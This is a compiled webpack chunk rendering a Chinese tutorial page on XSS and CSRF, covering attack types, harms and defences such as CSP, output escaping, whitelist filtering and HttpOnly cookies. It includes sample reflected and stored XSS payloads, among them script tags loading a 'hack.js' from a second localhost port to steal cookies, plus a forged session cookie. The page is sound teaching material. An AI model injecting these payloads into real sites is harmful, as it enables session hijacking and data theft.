(window.webpackJsonp=window.webpackJsonp||[]).push([[57],{257:function(t,s,a){"use strict";a.r(s);var n=a(0),r=Object(n.a)({},(function(){var t=this,s=t.$createElement,a=t._self._c||s;return a("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[a("h1",{attrs:{id:"xss和csrf"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#xss和csrf"}},[t._v("#")]),t._v(" XSS和CSRF")]),t._v(" "),a("h2",{attrs:{id:"一、xss"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#一、xss"}},[t._v("#")]),t._v(" 一、XSS")]),t._v(" "),a("p",[t._v("XSS (Cross-Site Scripting)，跨站脚本攻击，因为缩写和 CSS重叠，所以只能叫 XSS。\n跨站脚本攻击是指通过存在安全漏洞的Web网站注册用户的浏览器内运行非法的非本站点HTML标签或JavaScript进行的一种攻击。\n跨站脚本攻击有可能造成以下影响:")]),t._v(" "),a("ul",[a("li",[t._v("利用虚假输入表单骗取用户个人信息。")]),t._v(" "),a("li",[t._v("利用脚本窃取用户的Cookie值，被害者在不知情的情况下，帮助攻击者发送恶意请求。")]),t._v(" "),a("li",[t._v("显示伪造的文章或图片。")])]),t._v(" "),a("h3",{attrs:{id:"xss攻击分类"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#xss攻击分类"}},[t._v("#")]),t._v(" XSS攻击分类")]),t._v(" "),a("ul",[a("li",[t._v("反射型 - url参数直接注入")])]),t._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v('// 普通\nhttp://localhost:3000/?from=china\n// alert尝试\nhttp://localhost:3000/?from=<script>alert(3)<\/script>\n// 获取Cookie\nhttp://localhost:3000/?from=<script src="http://localhost:4000/hack.js"><\/script>\n// 短域名伪造 https://dwz.cn/\n// 伪造cookie入侵 chrome\ndocument.cookie="kaikeba:sess=eyJ1c2VybmFtZSI6Imxhb3dhbmciLCJfZXhwaXJlIjoxNTUzNTY1MDAxO\nDYxLCJfbWF4QWdlIjo4NjQwMDAwMH0="\n')])])]),a("ul",[a("li",[t._v("存储型 - 存储到DB后读取时注入")])]),t._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v('// 评论\n<script>alert(1)<\/script>\n// 跨站脚本注入\n我来了<script src="http://localhost:4000/hack.js"><\/script>\n')])])]),a("h3",{attrs:{id:"xss攻击危害"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#xss攻击危害"}},[t._v("#")]),t._v(" XSS攻击危害")]),t._v(" "),a("ul",[a("li",[t._v("获取页面数据")]),t._v(" "),a("li",[t._v("获取Cookies")]),t._v(" "),a("li",[t._v("劫持前端逻辑")]),t._v(" "),a("li",[t._v("发送请求")]),t._v(" "),a("li",[t._v("偷取网站的任意数据")]),t._v(" "),a("li",[t._v("偷取用户的资料")]),t._v(" "),a("li",[t._v("偷取用户的秘密和登录态")]),t._v(" "),a("li",[t._v("欺骗用户")])]),t._v(" "),a("h3",{attrs:{id:"防范手段"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#防范手段"}},[t._v("#")]),t._v(" 防范手段")]),t._v(" "),a("ul",[a("li",[t._v("服务端设置HEAD")])]),t._v(" "),a("div",{staticClass:"language-js extra-class"},[a("pre",{pre:!0,attrs:{class:"language-js"}},[a("code",[t._v("ctx"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("set")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'X-XSS-Protection'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// 禁止XSS过滤")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// http://localhost:3000/?from=<script>alert(3)<\/script> 可以拦截 但伪装一下就不行了")]),t._v("\n")])])]),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("0 禁止XSS过滤。\n1 启用XSS过滤（通常浏览器是默认的）。\n\n如果检测到跨站脚本攻击，浏览器将清除页面（删除不安全的部分）。\n1;mode=block 启用XSS过滤。 如果检测到攻击，浏览器将不会清除页面，而是阻止页面加载。\n1;report= (Chromium only)  启用XSS过滤。 如果检测到跨站脚本攻击，浏览器将清除页面并使用CSP report-uri 指令的功能发送违规\n报告。\n")])])]),a("ul",[a("li",[t._v("CSP")])]),t._v(" "),a("p",[t._v("内容安全策略 (CSP, Content Security Policy) 是一个附加的安全层，用于帮助检测和缓解某些类型的攻\n击，包括跨站脚本 (XSS) 和数据注入等攻击。 这些攻击可用于实现从数据窃取到网站破坏或作为恶意软\n件分发版本等用途。\nCSP 本质上就是建立白名单，开发者明确告诉浏览器哪些外部资源可以加载和执行。我们只需要配置规则，如何拦截是由浏览器自己实现的。我们可以通过这种方式来尽量减少 XSS 攻击。")]),t._v(" "),a("div",{staticClass:"language-js extra-class"},[a("pre",{pre:!0,attrs:{class:"language-js"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// 只允许加载本站资源")]),t._v("\nContent"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Security"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Policy"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("default")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("src "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'self'")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// 只允许加载 HTTPS 协议图片")]),t._v("\nContent"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Security"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Policy"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" img"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("src https"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("/*\n// 不允许加载任何来源框架\nContent-Security-Policy: child-src 'none'\nctx.set('Content-Security-Policy', \"default-src 'self'\")\n// 尝试一下外部资源不能加载\nhttp://localhost:3000/?from=<script src=\"http://localhost:4000/hack.js\"><\/script>\n")])])])]),a("ul",[a("li",[t._v("转义字符")])]),t._v(" "),a("p",[t._v("用户的输入永远不可信任的，最普遍的做法就是转义输入输出的内容，对于引号、尖括号、斜杠进行转义")]),t._v(" "),a("div",{staticClass:"language-js extra-class"},[a("pre",{pre:!0,attrs:{class:"language-js"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// 黑名单转义")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("function")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("escape")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token parameter"}},[t._v("str")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n    str "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" str"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("replace")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token regex"}},[t._v("/&/g")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'&amp;'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n    str "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" str"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("replace")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token regex"}},[t._v("/</g")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'&lt;'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n    str "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" str"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("replace")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token regex"}},[t._v("/>/g")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'&gt;'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n    str "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" str"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("replace")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token regex"}},[t._v('/"/g')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'&quto;'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n    str "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" str"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("replace")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token regex"}},[t._v("/'/g")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'&#39;'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n    str "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" str"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("replace")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token regex"}},[t._v("/`/g")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'&#96;'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n    str "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" str"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("replace")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token regex"}},[t._v("/\\//g")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'&#x2F;'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("return")]),t._v(" str\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])])]),a("p",[t._v("富文本来说，显然不能通过上面的办法来转义所有字符，因为这样会把需要的格式也过滤掉。对于这种情况，通常采用白名单过滤的办法，当然也可以通过黑名单过滤，但是考虑到需要过滤的标签和标签属性实在太多，更加推荐使用白名单的方式。")]),t._v(" "),a("div",{staticClass:"language-js extra-class"},[a("pre",{pre:!0,attrs:{class:"language-js"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// 白名单转义")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("const")]),t._v(" xss "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("require")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'xss'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("let")]),t._v(" html "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("xss")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('\'<h1 id="title">XSS Demo</h1><script>alert("xss");<\/script>\'')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v('// -> <h1>XSS Demo</h1>&lt;script&gt;alert("xss");&lt;/script&gt;')]),t._v("\nconsole"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("log")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("html"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])])]),a("ul",[a("li",[t._v("HttpOnly Cookie")])]),t._v(" "),a("p",[t._v("这是预防XSS攻击窃取用户cookie最有效的防御手段。Web应用程序在设置cookie时，将其属性设为HttpOnly，就可以避免该网页的cookie被客户端恶意JavaScript窃取，保护用户cookie信息。")]),t._v(" "),a("div",{staticClass:"language-js extra-class"},[a("pre",{pre:!0,attrs:{class:"language-js"}},[a("code",[t._v("response"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("addHeader")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"Set-Cookie"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"uid=112; Path=/; HttpOnly"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])])]),a("h2",{attrs:{id:"二、csrf"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#二、csrf"}},[t._v("#")]),t._v(" 二、CSRF")]),t._v(" "),a("p",[t._v("CSRF(Cross Site Request Forgery)，即跨站请求伪造，是一种常见的Web攻击，它利用用户已登录的身份，\n在用户毫不知情的情况下，以用户的名义完成非法操作。")]),t._v(" "),a("ul",[a("li",[t._v("用户已经登录了站点 A，并在本地记录了 cookie")]),t._v(" "),a("li",[t._v("在用户没有登出站点 A 的情况下（也就是 cookie生效的情况下），访问了恶意攻击者提供的引诱危险站点 B (B 站点要求访问站点A)。")]),t._v(" "),a("li",[t._v("站点 A 没有做任何 CSRF 防御")])]),t._v(" "),a("h3",{attrs:{id:"csrf攻击危害"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#csrf攻击危害"}},[t._v("#")]),t._v(" CSRF攻击危害")]),t._v(" "),a("ul",[a("li",[t._v("利用用户登录态")]),t._v(" "),a("li",[t._v("用户不知情")]),t._v(" "),a("li",[t._v("完成业务请求")]),t._v(" "),a("li",[t._v("盗取用户资金（转账，消费）")]),t._v(" "),a("li",[t._v("冒充用户发帖背锅")]),t._v(" "),a("li",[t._v("损害网站声誉")])]),t._v(" "),a("h3",{attrs:{id:"防范手段-2"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#防范手段-2"}},[t._v("#")]),t._v(" 防范手段")]),t._v(" "),a("ul",[a("li",[t._v("Referer验证（判断页面的来源referer是否来自本站）")]),t._v(" "),a("li",[t._v("验证码(最有效)")]),t._v(" "),a("li",[t._v("Token 令牌验证（因为token是加在头部的，而csrf在伪造请求的时候只会带上cookie，不会带上token，所以就可以避免攻击）")]),t._v(" "),a("li",[t._v("禁止第三方网站带Cookie - 有兼容性问题")])]),t._v(" "),a("h2",{attrs:{id:"三、两者区别"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#三、两者区别"}},[t._v("#")]),t._v(" 三、两者区别")]),t._v(" "),a("ul",[a("li",[t._v("CSRF需要用户先登录网站A，XSS不需要登录。")]),t._v(" "),a("li",[t._v("CSRF是利用网站A本身的漏洞，去请求网站A的api，XSS是向网站A注入JS代码，然后执行JS里的代码，篡改网站A的内容。")])])])}),[],!1,null,null,null);s.default=r.exports}}]);